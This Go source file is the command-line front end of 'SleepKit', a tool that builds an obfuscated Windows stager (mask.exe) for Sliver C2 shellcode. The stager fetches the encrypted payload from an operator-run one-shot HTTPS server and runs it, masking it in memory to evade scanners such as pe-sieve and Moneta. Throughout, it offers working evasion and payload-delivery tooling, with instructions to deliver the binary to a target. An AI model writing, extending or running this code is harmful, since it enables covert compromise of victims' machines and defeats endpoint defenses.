// SleepKit — Sliver sleep-mask host builder.
//
// Builds a Windows binary (mask.exe) that hosts Sliver shellcode with XOR
// memory masking during sleep intervals. Comparable to the Cobalt Strike Sleep
// Mask Kit, adapted for Sliver's Go-runtime constraints.
package main

import (
	"fmt"
	"net/url"
	"os"
	"time"

	"github.com/spf13/cobra"
	"sleepkit/internal/stage"
)

var rootCmd = &cobra.Command{
	Use:   "sleepkit",
	Short: "Sliver sleep-mask host builder",
	Long: `SleepKit builds a Windows shellcode host (mask.exe) that XOR-encrypts Sliver
shellcode in memory during sleep intervals, defeating memory scanners that scan
at rest (pe-sieve, Moneta, BeaconEye).

Two masking layers run concurrently:

  Hook layer   — patches kernel32!Sleep in the host process; any Win32 Sleep
                 call from the shellcode triggers encrypt → real sleep → decrypt.
                 Uses KernelBase.dll bypass to call the real Sleep without
                 re-entering the hook.

  Timer layer  — best-effort backup for Sliver's primary callback sleep, which
                 uses Go's time.Sleep → NtWaitForSingleObject (not Win32 Sleep).
                 Suspends the shellcode thread, masks for 600ms, unmasks, resumes.
                 Set --sleep to match your Sliver profile's sleep interval.

Use Sliver's shellcode format to avoid two-Go-runtime conflicts:

  sliver > generate --format shellcode --os windows --arch amd64 \
           --sleep 30 --jitter 10 --c2 ... --save /tmp/beacon.bin`,
}

// ── build ─────────────────────────────────────────────────────────────────

var buildCmd = &cobra.Command{
	Use:   "build",
	Short: "Encrypt shellcode and build the Windows mask host (mask.exe)",
	Long: `Encrypts a Sliver shellcode binary with ChaCha20-Poly1305 and cross-compiles
cmd/mask for Windows amd64, embedding the payload URL, encryption keys, and
sleep interval via -ldflags.

Delivery:
  1. Start the payload server: sleepkit serve --payload build/payload.enc
     (or pass --serve to do it automatically)
  2. Deliver mask.exe to the target via your preferred method.
  3. mask.exe fetches and executes the shellcode with sleep masking active.`,
	Example: `  sleepkit build --shellcode /tmp/beacon.bin --url https://192.168.1.10:8443/p --sleep 30s --serve
  sleepkit build --shellcode /tmp/beacon.bin --url https://192.168.1.10:8443/p --sleep 5m --garble -o build/`,
	RunE: runBuild,
}

var (
	buildShellcode string
	buildURL       string
	buildSleep     string
	buildOutput    string
	buildServe     bool
	buildPort      int
	buildGarble    bool
)

func init() {
	buildCmd.Flags().StringVar(&buildShellcode, "shellcode", "", "path to Sliver shellcode binary (.bin, --format shellcode) (required)")
	buildCmd.Flags().StringVar(&buildURL, "url", "", "HTTPS URL mask.exe will fetch the payload from (required)")
	buildCmd.Flags().StringVar(&buildSleep, "sleep", "30s", "Sliver beacon sleep interval (match your profile's --sleep); e.g. 30s, 2m")
	buildCmd.Flags().StringVarP(&buildOutput, "output", "o", "build", "output directory")
	buildCmd.Flags().BoolVar(&buildServe, "serve", false, "start one-time HTTPS payload server after building")
	buildCmd.Flags().IntVar(&buildPort, "port", 8443, "port for payload server (when --serve)")
	buildCmd.Flags().BoolVar(&buildGarble, "garble", false, "obfuscate mask.exe with garble (requires garble in PATH)")
	_ = buildCmd.MarkFlagRequired("shellcode")
	_ = buildCmd.MarkFlagRequired("url")
}

func runBuild(_ *cobra.Command, _ []string) error {
	sc, err := os.ReadFile(buildShellcode)
	if err != nil {
		return fmt.Errorf("reading shellcode: %w", err)
	}
	if err := os.MkdirAll(buildOutput, 0o755); err != nil {
		return err
	}

	dur, err := time.ParseDuration(buildSleep)
	if err != nil {
		return fmt.Errorf("invalid --sleep value %q (use Go duration, e.g. 30s, 2m): %w", buildSleep, err)
	}
	sleepMS := int(dur.Milliseconds())

	bundle, err := stage.Encrypt(sc)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	payloadPath := buildOutput + "/payload.enc"
	if err := os.WriteFile(payloadPath, bundle.Ciphertext, 0o600); err != nil {
		return fmt.Errorf("writing payload: %w", err)
	}

	// When --serve: generate server early so the random path is known before
	// compiling mask.exe. The URL baked into mask.exe must match the server path.
	effectiveURL := buildURL
	var srv *stage.Server
	if buildServe {
		srv = stage.NewServer(bundle.Ciphertext, buildPort)
		base, err := url.Parse(buildURL)
		if err != nil {
			return fmt.Errorf("invalid --url: %w", err)
		}
		effectiveURL = fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, srv.Path())
	}

	maskPath, err := stage.BuildMask(bundle, effectiveURL, buildOutput, sleepMS, buildGarble)
	if err != nil {
		return fmt.Errorf("building mask.exe: %w", err)
	}

	fmt.Printf("[+] payload  → %s\n", payloadPath)
	fmt.Printf("[+] mask.exe → %s\n", maskPath)
	fmt.Printf("[+] sleep    → %s (%d ms)\n", buildSleep, sleepMS)

	if buildServe {
		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", buildPort)
		fmt.Printf("[+] Staging URL: %s\n", effectiveURL)
		fmt.Printf("    (random path — baked into mask.exe, only this URL works)\n")
		fmt.Printf("[i] Deliver mask.exe to target. It fetches shellcode and runs with sleep masking.\n")
		return srv.ListenAndServe()
	}

	fmt.Printf("[+] url      → %s\n", effectiveURL)
	fmt.Printf("[i] Deliver mask.exe to target. Start the staging server first:\n")
	fmt.Printf("[i]   sleepkit serve --payload %s --port %d\n", payloadPath, buildPort)
	fmt.Printf("[i] The URL printed by serve must match the --url you used here.\n")
	return nil
}

// ── serve ─────────────────────────────────────────────────────────────────

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Serve an encrypted payload once over HTTPS then shut down",
	Example: `  sleepkit serve --payload build/payload.enc --port 8443`,
	RunE: runServe,
}

var (
	servePayload string
	servePort    int
)

func init() {
	serveCmd.Flags().StringVar(&servePayload, "payload", "", "path to encrypted payload file (required)")
	serveCmd.Flags().IntVar(&servePort, "port", 8443, "port to listen on")
	_ = serveCmd.MarkFlagRequired("payload")
}

func runServe(_ *cobra.Command, _ []string) error {
	data, err := os.ReadFile(servePayload)
	if err != nil {
		return fmt.Errorf("reading payload: %w", err)
	}
	srv := stage.NewServer(data, servePort)
	fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", servePort)
	fmt.Printf("[+] Staging URL: https://<your-ip>:%d%s\n", servePort, srv.Path())
	fmt.Printf("    Build mask.exe with: sleepkit build --url https://<your-ip>:%d%s ...\n\n", servePort, srv.Path())
	return srv.ListenAndServe()
}

// ── root ──────────────────────────────────────────────────────────────────

func init() {
	rootCmd.AddCommand(buildCmd, serveCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
